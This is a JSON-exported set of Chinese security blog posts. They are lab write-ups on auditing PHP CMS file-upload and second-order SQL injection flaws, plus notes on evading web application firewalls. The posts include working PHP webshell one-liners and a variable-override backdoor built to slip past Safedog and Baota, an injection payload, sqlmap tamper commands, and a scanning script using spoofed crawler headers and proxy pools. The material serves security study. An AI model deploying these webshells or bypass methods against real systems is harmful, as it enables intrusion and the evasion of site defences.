总结如果发现thinkPHP框架，可能存在以下思路：\n1、如果按照thinkPHP去写，就是thinkPHP的框架漏洞；\n2、如果虽然存在thinkPHP框架，但是没有利用框架，就是常规的审计思路。\n","slug":"代码审计-TP5框架1","date":"2022-06-18T01:49:09.000Z","categories_index":"代码审计","tags_index":"代码审计","author_index":"Aurora"},{"id":"702d6f073e84f9179e4d91ac7d1a1d09","title":"代码审计-PHP框架MVC类上传断点调试挖掘","content":"0x00 关键字搜索函数，键字，全局变量等\n文件上传的相关函数：move_uploaded_file 等；\n文件上传的关键字：在写上传的时候会有注释，如&#x2F;&#x2F;上传；\n全局变量$_FILES‘\n应用功能抓包：（任何可能存在上传的应用功能点），前台会员中心，后台新闻添加等可能存在上传的地方。\nPHP$_FILES函数：\n\n参考文章：https://blog.csdn.net/haoyunyun888/article/details/81079274\n0x01 MVC 开发框架类MVC架构图解：\n\n参考文章：\nhttps://www.cnblogs.com/wsybky/p/8638876.html\n0x02 Thinkphp框架参考文章：https://sites.thinkphp.cn/1556331\n0x03 BeesCMS无框架后台任意文件上传0x00思路：搜索$_FILES-&gt;后台中心-&gt;上传图像-&gt;跟踪代码-&gt;逻辑判断\n0x01打开靶场首页：\n0x02将源码载入到审计工具中：\n0x03这里先使用搜索关键字进行查找相关功能点，搜索上传：\n\n有很多文件，截图只截了一部分，不便于查找，改搜索$_FILES：\n\n这里只有几个文件；并且根据文件的名字可以猜测是后台的文件上传。\n0x04随便打开一个文件查看，都是处理上传文件的过程：\n浏览器访问其文件，可以看到有上传的功能点：\n0x05先上传一个文件抓个包：\n数据包中有参数file_info,uppic：\n\n\n在源码中找到这两个参数进行审计：\n首先uppic使用post方式接收数据赋值给submit，如果submit存在数据，参数up使用post方式接收数据赋值给变量up，file_info利用post接收数据在利用fl_html()函数转化为html格式赋值给变量$file_info，变量$value_arr使用array()函数存储数组；explode()函数将文件类型以|分割为数组，—is_uploaded_file()函数检查指定的文件是否是通过 HTTP POST 上传的。如果文件是通过 HTTP POST 上传的返回 TRUE,可以用来确保恶意的用户无法欺骗脚本去访问本不能访问的文件。$_FILES[&#39;up&#39;][&#39;tmp_name&#39;]是is_uploaded_file()要检查的文件，up是要上传的表单名，tmp_name变量中的值就是文件在Web服务器中临时存储的位置（上传文件的临时保存文件），确定文件的大小限度（这里是系统设置的值），up_file处理上传的文件，并且验证是否符合上传标准根据up_file返回值（返回的字典形式）确定文件的路径、扩展名、大小、时间，最后在进行数据库的插入操作。\n涉及函数：\nis_uploaded_file() 函数：检查指定的文件是否是通过 HTTP POST 上传的。如果文件是通过 HTTP POST 上传的，该函数返回 TRUE。\npathinfo() 函数以数组的形式返回关于文件路径的信息。\n\n\nup_file()函数：（自定义函数）判断文件的大小，路径扩展名等。\nfunction up_file($file,$size,$type,$path&#x3D;&#39;&#39;,$name&#x3D;&#39;&#39;)&#123;\n\t\t$return_arr&#x3D;array();\n\t\tif(is_uploaded_file($file[&#39;tmp_name&#39;]))&#123;\n\t\tif($file[&#39;size&#39;]&gt;$size)&#123;msg(&#39;文件超过&#39;.$size.&#39;大小&#39;);&#125;\n\t\t$pic_name&#x3D;pathinfo($file[&#39;name&#39;]);\n\t\t$file_type&#x3D;$pic_name[&#39;extension&#39;];\n\t\t$return_arr[&#39;ext&#39;] &#x3D; $pic_name[&#39;extension&#39;];&#x2F;&#x2F;扩展名\n\t\t$return_arr[&#39;size&#39;] &#x3D; $file[&#39;size&#39;];&#x2F;&#x2F;大小\n\t\tif(!in_array($file_type,$type))&#123;msg(&#39;上传文件格式不正确&#39;.$file_type);&#125;\n\t\t$path&#x3D;empty($path)?CMS_PATH.&quot;upload&#x2F;file&#x2F;&quot;:CMS_PATH.$path.&#39;&#x2F;&#39;;\n\t\tif(!file_exists($path))&#123;\n\t\t\t@mkdir($path);\n\t\t&#125;\n\t\t$name&#x3D;$pic_name[&#39;filename&#39;].&#39;-&#39;.date(&#39;YmdHis&#39;);\n\t\t$name2&#x3D;iconv(&#39;UTF-8&#39;,&#39;GBK&#39;,$name);\n\n\t\t$file_name&#x3D;$path.$name2.&#39;.&#39;.$pic_name[&#39;extension&#39;];\n\t\t$file_name2&#x3D;$path.$name.&#39;.&#39;.$pic_name[&#39;extension&#39;];\n\t\t\n\t\tif(file_exists($file_name))&#123;\n\t\t\tmsg(&#39;已经存在该附件，请更改附件名称！&#39;);&#x2F;&#x2F;判断是否重名\n\t\t&#125;\n\t\t\n\t\tunset($pic_name);\n\t\tif(!move_uploaded_file($file[&#39;tmp_name&#39;],$file_name))&#123;\n\t\t\tmsg(&#39;文件上传失败&#39;);\n\t\t&#125;\n\t\t$return_name&#x3D;str_replace(CMS_PATH,&quot;&quot;,$file_name2);\n\t\t&#x2F;&#x2F;$return_name&#x3D;CMS_SELF.$return_name;\n\t\t$return_arr[&#39;file&#39;] &#x3D; $return_name;&#x2F;&#x2F;上传文件路径\n\t\t$return_arr[&#39;time&#39;] &#x3D; time();&#x2F;&#x2F;上传时间\n\t\t&#125;else&#123;\n\t\t\tmsg(&#39;文件不能为空&#39;);\n\t\t&#125;\n\t\t&#x2F;&#x2F;存储相关信息\n\t\t\n\treturn $return_arr;\n&#125;\n\n explode() 函数：使用一个字符串分割另一个字符串，并返回由字符串组成的数组。\n\n0x06将数据包放出去后查看返回信息，上传文件格式不正确。\nup_file()函数定义返回数据包的结果，刚才的提示应该就是这段代码处理的：\n\n确定一下报错信息是否在这个代码段，加一个x在后面，再查看报错信息：\n\n可以看到报错信息有x，可以确定报错代码段就是up_file函数段，那这里绕过拓展名就可以达到上传的目的。\npathinfo()函数接受文件名赋值给pic_name，pic_name又将文件的拓展名extension截取到赋值给file_type：\n\n之后file_type接受的文件名不在所定义的文件名中就会报错：\n\n0x07这里尝试绕过pathinfo()函数的后缀名检测：只要接收的后缀名能够是自定义的即可进行绕过，但根据测试来看，pathinfo()函数只接收最后一个.之后的后缀名，导致无法添加多个后缀名绕过：\n\n尝试00截断，先上传一个符合要求的后缀名文件，之后添加.php%00（由于是post方式提交，这里的%00需要编码），放包之后回显还是报错，并且结果是php后缀名的报错，证明截断成功了，但是接受的是php文件，导致又被过滤上传失败，这个地方绕过不了。\n\n0x08换一个$_FILES函数存在的文件（admin_pic_upload.php：\n\n找到过滤代码函数up_img()，定位：\n\n这里只判断了图片大小和格式，并且只判断了上传图片的格式，如果图片格式正确可以实现绕过。（MIME类型）\n0x09浏览器打开访问地址：\n\n上传文件测试，可以看到有返回路径：\n0x10修改后缀上传php文件，放包：\n\n打开文件路径可以看到php文件上传成功，之后使用连接工具可以进行获取权限。\n\n这里就挖到了文件上传漏洞。\n0x04 PHPStorm+Xdebug断点调试0x00使用PHPStorm+Xdebug断点调试配置教程和下载地址：\nXdebug下载地址： \nhttps://xdebug.org/download/historical\nPhpStorm+Xdebug+phpstudy配置教程（很细的一篇教程）：\nhttps://blog.csdn.net/weixin_41707419/article/details/123662603\n0x01配置完成环境后，使用phpstorm加载项目：\n打开监听端口，点击调试：\n\n0x01可以看到test正在调试，url的路径出现xdebug的参数，并且自动在浏览器打开相应页面，之后可以使用步入键等一步一步查看代码运行过程：\n\n\n箭头向下是步入下一步，第二个是强制步入，箭头向上是跳出，点击向下的箭头，会依次执行函数和文件（包括文件包含的文件的每一步）。\n0x02断点调试优点：\n1、不需要看懂代码，就知道经历了那些函数，和涉及的参数\n2、这里的抓包是从代码层面\n3、主要运用在Java，因为Java框架比较多，很可能看不懂，在这里就需要运用到断点调试\n0x05 Finecms基于前台MVC任意文件上传0x00打开靶场，点击会员中心：\n有上传头像的功能，可以测试是否存在文件上传漏洞。\n\n0x01上传文件抓包，（基于MVC的框架网站）\n\n0x02MVC简介：\n1、模型Model：管理大部分的业务逻辑和所有的数据库逻辑。模型提供了连接和操作数据库的抽象层。\n2、控制器Controller - 负责响应用户请求、准备数据，以及决定如何展示数据。\n3、视图View – 负责渲染数据，通过HTML方式呈现给用户\n一个典型的Web MVC流程：\n1、Controller截获用户发出的请求；\n2、Controller调用Model完成状态的读写操作；\n3、Controller把数据传递给View；\n4、View渲染最终结果并呈献给用户.\n0x03数据包中s&#x3D;member，c&#x3D;account，m&#x3D;upload这些参数在index.php代码中去找：\n\nindex.php没有找到s,c,m接收参数的代码，这就是典型的MVC的框架，即核心代码没有在指向文件里面，需要查看入口文件；这里的入口文件，FCPPATH(后面有一个fineCMS的目录)和WEBPATH，包含了init.php文件(FCPPATH为定义的路径)；\n0x04查看finecms目录，有init.php文件和三个文件夹：\n打开init.php文件：\n这里system目录下就是框架的代码，dayrui是二次开发的代码；\n根据路由规则匹配参数（也就是传递参数的规则）\n\n\n这段代码看到s，c，m这三个参数，看到相应目录；数据包中的s对应目录，c对应文件名,m对应方法。\n0x05在MVC框架内的controller中，查找member目录，文件名为account，函数为upload（一般核心代码都在控制器里面）\n\n\n\n在controllers文件夹下查找account.php文件下的upload方法，post传参，tx接收参数，然后用将空替换为+，赋值为file，file再使用正则表达式匹配规则匹配出合适的值将结果赋值给result；之后使用new_file接收文件地址，在这里没有任何过滤；下面的代码才是过滤。\n代码中输出result[2]的值查看结果：\n\n返回jpeg，证明result[2]存储的就是后缀名；\n输出new_file值，图片路径：\n0x06这里可以确定[0]是全部的数据，[1]是data，[2]是png（文件后缀名），[3]是base64\n\n0x07抓包直接上传文件返回1\n\n由于没有验证，修改后缀名上传：\n\n\n可以看到上传成功。\n0x08 总结1、业务功能分析-&gt;会员中心-&gt;上传图像-&gt;跟踪代码-&gt;逻辑判断；\n2、存在逻辑漏洞，即先上传，后验证。\n","slug":"代码审计-PHP框架MVC类上传断点调试挖掘","date":"2022-06-13T02:24:54.000Z","categories_index":"代码审计","tags_index":"代码审计","author_index":"Aurora"},{"id":"54d8350a6e513341975c7d9c3662fe93","title":"代码审计-CMS靶场","content":"0x00 骑士人才招聘系统-SQL注入挖掘0x00靶场：骑士人才招聘系统PHPCMS，3.4版本；\n描述：源码自带过滤机制。\n0x01使用seay源代码审计系统分析源码：\n0x02分析时需要找全局配置文件，一般全局配置文件就会又过滤机制；\n一般全局配置文件则是需要其他问价加载时包含其中，达到过滤机制，因此查找是找到inclde\n、common、function这样的文件或者文件夹去查看代码；例如：\n找到common.fun.php文件打开可以看到有过滤机制的代码：\n\n\n0x03首先common.fun.php文件先会检查你的php环境魔术引号是否开启：\n如果没打开，就用addslashes过滤，在套用mystrip_tags过滤一次：\naddslashes()函数：\n\n如果魔术引号开启，直接调用mystrip_tags()字符串进行过滤：\n\n0x04如果魔术引号开启，这里就变成了绕过魔术引号的注入；\n绕过魔术引号的的SQL注入：宽字节注入，二次注入；\n这里采用二次注入可以绕过魔术引号的转义，因此需要找到insert和update字段的功能点，一般为注册和修改信息。\n0x05点击会员中心创建新简历，随便填写信息保存下一步：\n从url来看，访问的文件夹路径是/user/personal/personal_resume.php：\n\n利用seay插件mysql监控，找到resume字段可以看到就是刚才填写的信息，接着update字段不是我们自己更改的信息，因此这里使用二次注入的条件不能够满足，另找功能点。\n\n0x06随便填写保存下一步：\n\n接着进行mysql监控查看信息，同样update还不是能够进行操作：（必须要update字段自己填写）\n0x07继续向下：\n\n\n可以看到直接进行了update，但这里没有进行insert，不能实现二次注入。\n0x08随便填写：\n\nmysql监控，可以看到这里的update出现了可控的字段xiao：\n\n测试字符是否能被通过：\n\ninsert字段：INSERT INTO resume_education (&#96;uid&#96;, &#96;pid&#96;, &#96;start&#96;, &#96;endtime&#96;, &#96;school&#96;, &#96;speciality&#96;, &#96;education&#96;, &#96;education_cn&#96;) VALUES (&#39;1&#39;, &#39;1&#39;, &#39;2013\\xC4\\xEA1\\xD4\\xC2&#39;, &#39;2014\\xC4\\xEA2\\xD4\\xC2&#39;, &#39;a\\&#39;&#39;, &#39;xiao&#39;, &#39;68&#39;, &#39;\\xD6\\xD0ר&#39;)\nupdate字段：UPDATE resume SET &#96;photo&#96;&#x3D;&#39;0&#39;, &#96;complete&#96;&#x3D;&#39;1&#39;, &#96;complete_percent&#96;&#x3D;&#39;60&#39;, &#96;key&#96;&#x3D;&#39;a&#39; \\xCF\\xEEĿ\\xBE\\xAD\\xC0\\xED&#x2F;\\xB2\\xFAƷ\\xBE\\xAD\\xC0\\xED xxxx00  \\xCF\\xEEĿ00 \\xCF\\xEEĿ\\xBE\\xAD\\xC0\\xED \\xBE\\xAD\\xC0\\xED00 \\xB2\\xFAƷ00 \\xB2\\xFAƷ\\xBE\\xAD\\xC0\\xED \\xB8\\xDF\\xD6\\xD000 xiao&#39;, &#96;refreshtime&#96;&#x3D;&#39;1655028523&#39; WHERE uid&#x3D;&#39;1&#39; AND id&#x3D;&#39;1&#39;\n\n可以看到insert字段中a的单引号被转义为\\，而update中a值正常，这就体现了二次注入的原理，在第一次进行数据库插入数据的时候，使用了 addslashes 、get_magic_quotes_gpc、mysql_escape_string、mysql_real_escape_string等函数对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数在过滤后会添加 “\\” 进行转义，但是“\\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。\n0x09插入payload：\naa&#39;,&#39;fullname&#39;&#x3D;user()#\n\n\n查看简历，可以看到姓名变成了root@localhost，后续可以继续进行其他的绕过读取用户数据。\n\n","slug":"代码审计-CMS靶场","date":"2022-06-12T08:33:39.000Z","categories_index":"代码审计","tags_index":"代码审计","author_index":"Aurora"},{"id":"731c1533414732448019e85116b30fa4","title":"代码审计--PHP无框架项目SQL注入挖掘技巧","content":"0x00脑图：\n0x01 使用Fortify进行代码审计使用sql靶场源代码为例，颜色代表漏洞危害等级，也可调试代码，可以为繁琐的手工审计节省出大量时间。\n\n0x02 定点挖掘0x00 关键字通过搜索特定关键字尝试寻找特定漏洞，如“select”“insert”“update”等与SQL漏洞自身相关的关键字，或者与变量，特定函数相关的关键字。\n0x01 功能点漏洞依靠特定函数实现，而特定函数一般用于实现相关功能。寻找相关功能点，抓包分析找到源码中特定的文件代码段，进行代码分析。\n例如文件上传漏洞，若存在上传的地址，之后通过上传的功能代码进行漏洞挖掘；sql注入也是同理，代码审计时候需要找到和数据库交互的代码段进行测试。\n0x02 拓展例如：sql注入\n1、数据库监控：监控当前页面和数据库交互的过程，即SQL语句的执行，适用于SQL注入；\n2、断点调试：访问页面对应代码进行断点调试，了解代码执行的前后顺序，调用的文件列表等。\n0x03 sqqyw源码审计0x00将源文件加载到工具当中：\n\n0x01搜索特定关键字，如：select，where等；\n全局搜索select：\n0x02打开其中一个发现编码有问题更改编码：\n\n\n0x03 之后对参数点，功能点进行追踪分析是否存在SQL注入漏洞；若存在注入点利用SQL注入的思路进行SQL注入。\n","slug":"代码审计-PHP无框架项目SQL注入挖掘技巧","date":"2022-06-11T09:55:23.000Z","categories_index":"代码审计","tags_index":"SQL注入,代码审计","author_index":"Aurora"},{"id":"21e0a43668edaae60c8a409447987781","title":"WAF绕过-权限控制","content":"0x00脑图：\n0x01 变量覆盖一句话木马，用eval()函数将字符串转换为PHP代码：\n&lt;?php @ev删掉这串汉字al($_POST[‘chop删掉这串汉字per’]);?>\n\n用ass删掉这串汉字ert代替eval()：\n（eval()会被检测）\n&lt;?php ass删掉这串汉字ert($_POST[‘chopper’]);?>\n\n变量覆盖，覆盖原始变量，安全狗追踪变量时无法找到变量b的出处：\n后门代码：绕过安全狗\n&lt;?php\n$a=$_GET[‘x’];\n\n$$a=$_GET[‘y’];\n\n$b($_POST[‘z’]);\n?>\n这里利用参数传递变量：$a接收x值b，而此时的b就是下面的$b,$a又接收y值assert,此时x值=y值，也就是$b=assert()；实现绕过。\n\n使用代码时传参：?x&#x3D;b&amp;y&#x3D;assert Post data：z&#x3D;需要执行的命令\n使用base64加密传输命令，绕过宝塔：\n&lt;?php\n$a=$_GET[‘x’];\n\n$$a=$_GET[‘y’];\n\n$b(base64_decode ($_POST[‘z’]));\n?> \n由于输入的z值可能会被宝塔检测到，例如：phpinfo()这样的函数，因此使用base64加密方式去绕过。\n\n\n\n0x02 加密混淆用enphp加密来绕过检测：\n一句话木马：\n&lt;?php assert(base64_decode ($_POST[‘z’]));?>\n\n在enphp的文件夹中打开cmd，执行“php.exe code_test.php”，可以通过“func_v2.php”来调整参数，程序会自动把“code_test”文件夹下的文件加密，加密结果生成在“encoded”文件夹下。\n原理：由于加密程度越高，越容易混淆，加密过于复杂，WAF在检测时候无法解密出原始代码，实现绕过。\nPHP在线加密：\nhttps://www.phpjiami.com/phpjiami.html \n0x03 工具连接带有编码解码绕过的一句话1、蚁剑，选中对应地址，右键“添加数据”，编码器选择对应的加密方式\n2、菜刀，无此功能\n3、冰蝎，双向加密传输\n冰蝎双向加密传输图解：\n\n","slug":"WAF绕过-权限控制","date":"2022-06-11T02:42:28.000Z","categories_index":"","tags_index":"Bypass WAF","author_index":"Aurora"},{"id":"33e492c349a108568658a2914e822de5","title":"WAF绕过-漏洞利用之注入上传跨站等绕过","content":"0x00脑图：\n0x01 SQL注入使用如sqlmap等工具注入时，为防止CC拦截，修改数据包us头模仿爬虫，或使用代理池\n安全狗：参考之前payload\nAliyun：基本修改指纹即可\n宝塔：匹配关键字，包括“&#x2F;*”，注入语句的每个“&#x2F;*”都改为“%00&#x2F;*”（利用了00截断）\nsqlmap使用语句：sqlmap –proxy&#x3D;”http://127.0.0.1:8080“ –tamper&#x3D;”waf.py” –random-agent\nsqlmap也可以用“–user-agent”指定ua\n（WAF有检测各种注入工具的请求头，因此要修改UA）\n0x02 文件上传截断，参考之前文件上传waf绕过payload。\n0x03 XSS跨站利用XSStrike绕过，加上“–timeout”或“–proxy”绕过CC。\n0x04 RCE1、加解密：尝试用base64、ASCII码等可逆的加密绕过；\n2、替换：在数据中插入某字符，同时加入将该字符替换为空的函数；\n3、利用变量覆盖或者把函数拆开然后用参数拼接（CTF常考）；\n4、base64不行就用ASCII码，加解密不行就用替换，GET不行就用REQUEST；\n0x05 文件包含符号变异，“\\”“&#x2F;”\n0x06 逻辑漏洞逻辑越权类的漏洞WAF不容易检测，也不容易拦截，一般不需要绕过WAF，基本不受WAF影响。\n","slug":"WAF绕过-漏洞利用之注入上传跨站等绕过","date":"2022-06-10T14:12:41.000Z","categories_index":"","tags_index":"Bypass WAF","author_index":"Aurora"},{"id":"60c32b8c4d5a420db76927924181a57e","title":"WAF绕过-漏洞发现之代理池指纹被动探针","content":"0x00脑图：\n0x01 漏洞发现触发WAF点-针对xray,awvs等1、扫描速度-(代理池，延迟，白名单等)：速度过快肯定会被拦截\n2、工具指纹-(特征修改，伪造模拟真实用户等)\n3、漏洞Payload-(数据变异，数据加密，白名单等)\n（热门的扫描工具（awvs，xray等）一般会被WAF拦截，针对单点的漏洞发现工具一般不会被拦截）\n0x02 代理池Proxy_pool项目搭建及使用使用方法：\n启用Redis数据库：“此电脑”右键“管理”“服务和应用程序”“Redis”右键“启用”\nsetting.py，在“HOST”处填写本地地址\nsetting.py，在“DB_CONN”处以“’redis:&#x2F;&#x2F;:password@ip:port&#x2F;db’”的格式填写Redis数据库的账号密码还有IP端口\n运行“proxyPool.py”，加参数“schedule”启动调度程序，加参数“server”启动api服务\n程序会将收集到的可用的代理写到数据库中。\n代理池项目地址：\nhttps://github.com/jhao104/proxy_pool\n0x03 Aliyun_os-awvs漏扫注入测试绕过-延时白名单对阿里云和宝塔的绕过基本采用延迟。\nawvs可以改变数据包内容，因此可以绕过工具指纹和漏洞payload检测，但xray没有相关功能所以没法绕过\n不同工具的判定方式不一样，一个工具被拦截可以换个工具试试\n新开发或冷门的扫描工具可能未被WAF收集，因此可以绕过工具指纹和漏洞payload检测\n如果工具没法控制发送速度，可以用burpsuite做漏扫工具的代理，使用鼠标点击器定速放出数据包。\n0x04 BT-awvs+xray漏扫Payload绕过-延时被动xray扫描不会被宝塔拦截，可能是因为宝塔暂未收录xray的信息\nawvs联动xray扫描：\n正常设置awvs，然后设置代理，代理可以直接设置为xray，也可以设置为burpsuite来看数据包发包情况，然后再转发到xray（被动扫描）。地址为“127.0.0.1”，端口自己设置。\n如果使用burpsuite，设置代理，从参照被动扫描部分\n打开xray，被动扫描，输入命令“.\\xray的程序名 webscan –listen 地址:端口”，地址端口与被动扫描的一致。\n启动xray，然后启动awvs，开始扫描\n（绕过安全狗同理）\n","slug":"WAF绕过-漏洞发现之代理池指纹被动探针","date":"2022-06-10T10:48:38.000Z","categories_index":"","tags_index":"Bypass WAF","author_index":"Aurora"},{"id":"7994f7b150cfea785dcbebf986580404","title":"WAF绕过-信息搜集反爬虫延时代理池技术","content":"0x00脑图：\n\n0x01 绕过手法1、请求方法：改变数据包的请求方法，如从Head改为更常见的Get\n2、模拟用户：修改整个数据包，使它更像一般用户发送的数据\n3、延时：两次访问间设置合适的时间间隔，以防触发拦截机制\n4、代理池：使用代理访问，避开对单个IP的限制\n5、爬虫引擎：为数据包添加搜索引擎的User-Agent，来模仿搜索引擎的爬虫\n6、白名单机制：白名单不受任何拦截机制限制\n0x02 Safedog-默认拦截机制分析绕过-未开CC使用WebPathBrute扫描目录，所有地址的状态码都是200，与事实不符\n将HTTP方法从“Head”改为“Get”即可绕过，Head方法快但会被拦截。\n0x03 Safedog-默认拦截机制分析绕过-开启CCCC攻击防护会设置单IP访问上限和代理访问上限，请求过于频繁会被拦截使用延迟扫描，设置合适的访问间隔用一般用户的数据包加搜索引擎的User-Agent，来模仿搜索引擎的爬虫使用代理访问，代理访问上限主要防备CC攻击，不一定会阻止目录扫描 。\n修改数据包UA实现爬虫引擎：例：\nMozilla&#x2F;5.0 (compatible; Baiduspider-render&#x2F;2.0; +http:&#x2F;&#x2F;www.baidu.com&#x2F;search&#x2F;spider.html)\n\n各大搜索引擎的User-Agent：\nhttps://www.cnblogs.com/iack/p/3557371.html \n0x04 Aliyun_os-默认拦截机制分析绕过无法修改，触发就会被封禁，只能通过延时或代理池绕过，无法通过爬虫引擎绕过。\n##0x05 BT(防火墙插件)-默认拦截机制分析绕过\n有CC攻击防护，还数据包内容过滤，可以通过延时或代理池绕过，绕过对特定关键词的检查，进一步使用延时或代理池，或对关键词变形。\n0x06 Python脚本搜索引擎爬虫模拟import requests\nimport time\nheaders&#x3D;{\n‘Connection’: ‘keep-alive’,\n‘Cache-Control’: ‘max-age&#x3D;0’,\n‘Upgrade-Insecure-Requests’: ‘1’,\n模拟用户 Kit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.105 Safari&#x2F;537.36\n模拟引擎 Mozilla&#x2F;5.0 (compatible; Baiduspider-render&#x2F;2.0; +http://www.baidu.com/search/spider.html)\n‘User-Agent’: \n‘Mozilla&#x2F;5.0 \n(compatible; \nBaiduspider-render&#x2F;2.0;+http://www.baidu.com/search/spider.html)’,\n‘Sec-Fetch-Dest’: ‘document’,\n‘Accept’:’text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,&#x2F;;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9’,\n‘Sec-Fetch-Site’: ‘none’,\n‘Sec-Fetch-Mode’: ‘navigate’,\n‘Sec-Fetch-User’: ‘?1’,\n‘Accept-Encoding’: ‘gzip, deflate, br’,\n‘Accept-Language’: ‘zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7’,\n‘Cookie’: ‘xxx’,#根据当前访问 cookie\n}\nfor paths in open(‘php_b.txt’,encoding&#x3D;’utf-8’):\nurl&#x3D;’http://192.168.0.103:8081/‘\npaths&#x3D;paths.replace(‘\\n’,’’)\nurls&#x3D;url+paths\n如需测试加代理，或加入代理池需加代理\nproxy &#x3D; {\n‘http’: ‘127.0.0.1:7777’}\ntry:\ncode&#x3D;requests.get(urls,headers&#x3D;headers,verify&#x3D;False).status_code\nprint(urls+’|’+str(code))\nif code&#x3D;&#x3D;200 or code&#x3D;&#x3D;403:\nprint(urls+’|’+str(code))\nexcept Exception as err:\nprint(‘connecting error’)\ntime.sleep(3)  模拟用户需延时 引擎可用可不用（根据请求速度）\n0x07 代理池使用代理池绕过WAF单个IP拦截，如下图：\n\n","slug":"WAF绕过-信息搜集反爬虫延时代理池技术","date":"2022-06-09T08:30:59.000Z","categories_index":"","tags_index":"Bypass WAF","author_index":"Aurora"},{"id":"3453cd6915cc1680ff9c8ccd16d4f69e","title":"漏洞发现-API接口服务类","content":"0x00脑图：\n0x01 端口服务类安全测试根据前期信息收集针对目标端口服务类探针后进行的安全测试；主要涉及攻击方法：口令安全，WEB类漏洞，版本漏洞等，其中产生的危害可大可小。属于端口服务&#x2F;第三方服务类安全测试面。一般在已知应用无思路的情况下选用的安全测试方案。\n0x02 API 接口-WebServiceRESTful API###0x00 API介绍\n根据应用自身的功能方向决定，安全测试目标需有 API 接口调用才能进行此类测试，主要涉及的安全问题：自身安全，配合 WEB，业务逻辑等，其中产生的危害可大可小，属于应用 API 接口网络服务测试面，一般也是在存在接口调用的情况下的测试方案。\n参考文章：\nhttps://xz.aliyun.com/t/2412\n0x01 WSDLWSDL（网络服务描述语言，Web Services Description Language）是一门基于XML的语言，用于描述Web Services以及如何对它们进行访问。 \n0x02 判断是否有API接口1、从功能点判断\n2、有无特定的漏洞关键字 \n0x03 漏洞关键字配合 shodan，fofa，zoomeye\ninurl:jws?wsdl\ninurl:asmx?wsdl\ninurl:aspx?wsdl\ninurl:ascx?wsdl\ninurl:ashx?wsdl\ninurl:dll?wsdl\ninurl:exe?wsdl\ninurl:php?wsdl\ninurl:pl?wsdl\ninurl:?wsdl\nfiletype:wsdl wsdl \n（其实就是谷歌黑客语法，有专门的书籍）\n0x03 端口常见漏洞0x00 Web服务类1、Tomcat –80&#x2F;8080&#x2F;8000\n\n\n\n\n\n\n\n\n\nmanager弱口令\nput上传webshell\nHTTP慢速攻击\najr文件包含漏洞–CVE-2020-1938\n2、Jboss –8080\n\n\n\n\n\n\n\n\n\n后台弱口令\nconsole后台部署war包\nJAVA反序列化\n远程代码执行\n3、WebSphere –9080\n\n\n\n\n\n\n\n\n\n后台弱口令\n任意文件泄漏\nJAVA反序列化\n4、Weblogic –7001&#x2F;7002\n\n\n\n\n\n\n\n\n\n后台弱口令\nconsole后台部署war包\nSSRF\n测试页面上传webshell\nJAVA反序列化–CVE-2018-2628、CVE-2018-2893、CVE-2017-10271、CVE-2019-2725、CVE-2019-2729\n5、Glassfish –8080&#x2F;4848\n\n\n\n\n\n\n\n\n\n暴力破解\n任意文件读取\n认证绕过\n6、Jetty –8080\n\n\n\n\n\n\n\n\n\n远程共享缓冲区溢出\n7、Apache –80&#x2F;8080\n\n\n\n\n\n\n\n\n\nHTTP慢速攻击\n解析漏洞\n目录遍历\n8、Apache Solr –8983\n\n\n\n\n\n\n\n\n\n远程命令执行–CVE-2017-12629、CVE-2019-0193\n9、IIS –80\n\n\n\n\n\n\n\n\n\nput上传webshell\nIIS解析漏洞\nIIS提权\nIIS远程代码执行–CVE-2017-7269\n10、Resin –8080\n\n\n\n\n\n\n\n\n\n目录遍历\n远程文件读取\n11、AXIS2 –8080\n\n\n\n\n\n\n\n\n\n后台弱口令\n12、Lutos –1352\n\n\n\n\n\n\n\n\n\n后台弱口令\n信息泄漏\n跨站脚本攻击\n13、Nginx –80&#x2F;443\n\n\n\n\n\n\n\n\n\nHTTP慢速攻击\n解析漏洞\n###0x01 数据库类\n1、MySQL –3306\n\n\n\n\n\n\n\n\n\n弱口令\n身份认证漏洞–CVE-2012-2122\n拒绝服务攻击\nphpmyadmin万能密码&#x2F;弱口令\nUDF&#x2F;MOF提权\n2、MsSQL –1433\n\n\n\n\n\n\n\n\n\n弱口令\n存储过程提取\n3、Oracle –1521\n\n\n\n\n\n\n\n\n\n弱口令\n未经授权访问\n4、Reids –6379\n\n\n\n\n\n\n\n\n\n弱口令\n未经授权访问\n5、PostgreSQL –5432\n\n\n\n\n\n\n\n\n\n弱口令\n缓冲区溢出–CVE-2014-2669\n6、MongoDB –27001\n\n\n\n\n\n\n\n\n\n弱口令\n未经授权访问\n7、DB2 –5000\n\n\n\n\n\n\n\n\n\n安全限制绕过进行未经授权操作–CVE-2015-1922\n8、SysBase –5000&#x2F;4100\n\n\n\n\n\n\n\n\n\n弱口令\n命令注入\n9、Memcache –11211\n\n\n\n\n\n\n\n\n\n未经授权访问\n配置漏洞\n10、ElasticSearch –9200&#x2F;9300\n\n\n\n\n\n\n\n\n\n未经授权访问\n远程代码执行\n文件办理\n写入webshell \n0x02 大数据类1、Hadoop –50010\n\n\n\n\n\n\n\n\n\n远程命令执行\n2、Zookeeper –2181\n\n\n\n\n\n\n\n\n\n未经授权访问\n0x03 文件共享1、FTP –21\n\n\n\n\n\n\n\n\n\n弱口令\n匿名访问\n上传后门\n远程溢出\n跳转攻击\n2、NFS –2049\n\n\n\n\n\n\n\n\n\n未经授权访问\n3、Samba –137\n\n\n\n\n\n\n\n\n\n弱口令\n未经授权访问\n远程代码执行–CVE-2015-0240\n4、LDAP –389\n\n\n\n\n\n\n\n\n\n弱口令\n注入\n未经授权访问\n0x04 远程访问1、SSH –22\n\n\n\n\n\n\n\n\n\n弱口令\n28退格漏洞\nOpenSSL漏洞\n用户名枚举\n2、Telent –23\n\n\n\n\n\n\n\n\n\n弱口令\n3、RDP –3389\n\n\n\n\n\n\n\n\n\n弱口令\nShitf粘滞键后门\n缓冲区溢出\nMS12-020\nCVE-2019-0708\n4、VNC 